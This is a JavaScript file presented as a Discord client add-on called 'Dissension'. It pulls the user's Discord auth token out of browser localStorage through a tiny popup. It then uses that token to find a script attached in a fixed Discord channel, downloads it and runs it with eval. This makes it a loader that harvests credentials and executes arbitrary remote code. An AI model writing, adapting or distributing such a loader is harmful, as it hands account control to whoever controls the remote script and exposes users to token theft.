//
//  DISSENSION
//  By UO
//  version: Dissension Client 0
// 
{
	let disscore = "2";
	(async function(){let diss={usertoken:function(){let popup;popup=window.open('','','width=1,height=1');if(!popup)return alert('Popup blocked! Please allow popups and try again.');popup.document.write("Getting token...");window.dispatchEvent(new Event('beforeunload'));window.tkn=JSON.parse(popup.localStorage.token);popup.close();return window.tkn},api:{async request(p){if(!p.token)p.token=diss.usertoken();if(!p.body){p.body=null}else{p.body=JSON.stringify(p.body)};p.url=p.url.replace('{channel.id}',document.location.pathname.split('/').pop());p.url=p.url.replace('{guild.id}',document.location.pathname.split('/')[2]);let res=await fetch(`https://discordapp.com/api/v9${p.url}`,{method:p.method,body:p.body,headers:{'Authorization':p.token,'Content-Type':'application/json'}}).catch(e=>{console.error("[Dissension] Discord API Error:"+e)});let data=res.json();return data},async findfile(name,channel){if(!channel)channel='{channel.id}';let messages=await diss.api.request({method:'GET',url:`/channels/${channel}/messages`});let result;for(var i=0;i<messages.length;i++){let message=messages[i];if(message.attachments.length<=0){continue};message.attachments.forEach(attachment=>{if(attachment.filename==name){result=attachment.url}})};return result}}};let core=await diss.api.findfile(disscore+".js",'842156448850903051');eval(await fetch(core).then(response=>response.text()))})()
}